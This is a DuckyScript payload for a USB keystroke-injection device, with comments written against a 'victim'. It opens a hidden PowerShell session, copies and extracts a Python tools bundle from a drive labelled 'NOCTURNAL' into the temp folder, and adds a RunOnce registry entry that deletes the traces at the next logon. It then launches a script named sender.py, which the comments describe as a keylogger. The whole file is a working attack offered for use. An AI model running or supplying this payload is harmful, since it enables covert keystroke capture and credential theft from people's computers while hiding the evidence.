REM Launch powershell
GUI r
DELAY 300
STRINGLN powershell -nop -noni
DELAY 900

REM Copy the tools.zip python bundle to the victim's temp folder
STRINGLN $tools = (get-volume -FriendlyName 'NOCTURNAL').DriveLetter+':\2\tools.zip'
STRINGLN Copy-Item $tools -Destination $env:TEMP

REM Some constants
STRINGLN $zippedTools = "$env:TEMP\tools.zip"
STRINGLN $tools = "$env:TEMP\tools"

REM Remove progress bar (saves time), extract the tools and remove the archive
STRINGLN $ProgressPreference = 'SilentlyContinue'
STRINGLN Expand-Archive -Path "$zippedTools" -DestinationPath "$tools"
STRINGLN Remove-Item "$zippedTools"

REM Implement a self-destruct protocol to delete all traces upon logout/reboot/shutdown
STRINGLN $deleteCommand = "powershell -w h -c `"Remove-Item -Path '$tools' -Recurse -Force`""
STRINGLN Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "VOID" -Value $deleteCommand

REM Send a visual cue to remove the key and start the keylogger immediately
STRINGLN Add-Type -AssemblyName System.Windows.Forms; (New-Object Windows.Forms.Form).Show(); Start-Sleep -m 300; [Windows.Forms.Application]::Exit(); & "$tools\python.exe $tools\sender.py"
